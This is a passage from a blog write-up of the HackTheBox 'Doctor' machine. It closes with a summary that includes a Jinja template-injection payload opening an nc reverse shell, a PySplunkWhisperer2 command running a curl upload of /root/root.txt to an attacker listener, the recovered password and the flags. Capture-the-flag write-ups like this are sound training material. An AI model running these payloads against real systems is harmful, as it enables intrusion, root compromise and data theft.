+<a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">article</a>
+that explains the concept on how to exploit Splunk for shells and persistence.</p>
+<p>The reason why this is interesting and it can help us obtain <code>root</code> access is because the Splunk
+service is actually run by the <code>root</code> user. We can confirm this by using our
+<a href="#reverse-shell">reverse shell</a> and running <code>ps</code></p>
+<pre><code>$ ps aux | grep splunkd
+root        1143  0.1  2.3 265920 93044 ?        Sl   Nov07   0:02 splunkd -p 8089 start
+root        1145  0.0  0.3  77664 15700 ?        Ss   Nov07   0:00 [splunkd pid=1143] splunkd -p 8089 start [process-runner]
+web         1734  0.0  0.0  17668   656 ?        S    00:07   0:00 grep splunkd
+</code></pre><p>Following the article and using the <a href="https://github.com/cnotin/SplunkWhisperer2"><code>PySplunkWhisperer2</code></a>
+tool, all we have to do is set it up so that <code>PySplunkWhisperer2_remote</code> sends us the
+<code>/root/root.txt</code> file. Since we already validated that we can use <code>shaun</code>&rsquo;s credentials for Splunk,
+that&rsquo;s what we&rsquo;ll pump into PySplunkWhisperer2 for the user name and password.</p>
+<pre><code>python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password &quot;Guitar123&quot; --payload &quot;curl -F 'data=@/root/root.txt' http://&lt;ip&gt;:4545&quot; --lhost &lt;ip&gt;
+</code></pre><p>In the above command, as previously stated, <code>&lt;ip&gt;</code> has to be replaced with your machine&rsquo;s IP address
+on the HackTheBox.eu network. We also need to setup netcat to receive the content with the following
+command</p>
+<pre><code>$ nc -lvp 4545
+Connection from 10.10.10.209:56646
+POST / HTTP/1.1
+Host: 10.10.15.9:4545
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: 219
+Content-Type: multipart/form-data; boundary=------------------------1e3af6b22be334f1
+
+--------------------------1e3af6b22be334f1
+Content-Disposition: form-data; name=&quot;data&quot;; filename=&quot;root.txt&quot;
+Content-Type: text/plain
+
+fe46f36187c9299663d023c7f9bd1d74
+
+--------------------------1e3af6b22be334f1--
+</code></pre><p>And there you have it. The contents of <code>/root/root.txt</code> have been gracefully sent to us through
+netcat. We now have the root flag and all that we need to solve for this box.</p>
+<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>This box was pretty challenging for an easy one &ndash; especially for the foothold. Finding the portal,
+the <code>/archive</code> endpoint where the actual SSTI is happening, getting the reverse shell and finding
+the password (needle in a haystack) were the most time consuming parts of this machine. The
+interesting thing in all of it is that it didn&rsquo;t take much wizardry to extract the necessary
+information to progress through the different steps and obtain the user flag. A good eye and enough
+curiosity is all that it took. I thoroughly enjoyed the learning opportunities this box provded and
+the fact that it forces you to dig and think outside the box instead of relying on scripts and CVEs.</p>
+<p>Rooting the box after finding the credentials was pretty straight forward. Thanks for sticking
+around and reading through  this article. I hope you enjoyed reading it as much as I enjoyed writing
+it. Special thanks go to my brother for his help with the review process of this article!</p>
+<ul>
+<li>redbay</li>
+</ul>
+<h2 id="tldr">TL;DR<a href="#tldr" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="foothold-1">Foothold<a href="#foothold-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>Put <code>10.10.10.209 doctors.htb</code> in your <code>/etc/hosts</code> file and use <code>doctors.htb</code> to access the HTTP
+server on the machine.</li>
+<li>Create an account on the login page and use the following as a title for your forum post:
+<code>{{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/asd;mkfifo /tmp/asd;cat /tmp/asd|/usr/bin/sh -i 2&gt;&amp;1|nc &lt;ip&gt; 4545 &gt;/tmp/asd').read()}}</code> and
+replace <code>&lt;ip&gt;</code> with your machine&rsquo;s IP address on the HackTheBox.eu network.</li>
+<li>Setup netcat to listen on port 4545 <code>nc -lvp 4545</code></li>
+<li>Surf to <code>doctors.htb/archive</code></li>
+<li>From your reverse shell, <code>grep -r -i 'reset_password' /var/log</code></li>
+<li>Find the <code>Guitar123</code> password from the logs.</li>
+</ol>
+<h3 id="user-1">User<a href="#user-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li><code>su shaun</code> and use the <code>Guitar123</code> password when prompted.</li>
+<li><code>cat /home/shaun/user.txt</code> -&gt; <code>7dfec0e6330b1ec2b10db9728217fb7e</code></li>
+</ol>
+<h3 id="root-1">Root<a href="#root-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>Use <a href="https://github.com/cnotin/SplunkWhisperer2">PySplunkWhisperer2</a> to exploit Splunk 8.0.5 and use Shaun&rsquo;s credentials (<code>shaun/Guitar123</code>)
+<code>python PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password &quot;Guitar123&quot; --payload &quot;curl -F 'data=@/root/root.txt' http://&lt;your IP&gt;:4545&quot; --lhost &lt;your IP&gt;</code></li>
+<li>Setup netcat to listen on port 4545 <code>nc -lvp 4545</code></li>
+<li>Wait and get root flag -&gt; <code>fe46f36187c9299663d023c7f9bd1d74</code></li>
+</ol>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Reda Baydoun</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+  <script src="/assets/languageSelector.js"></script>
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
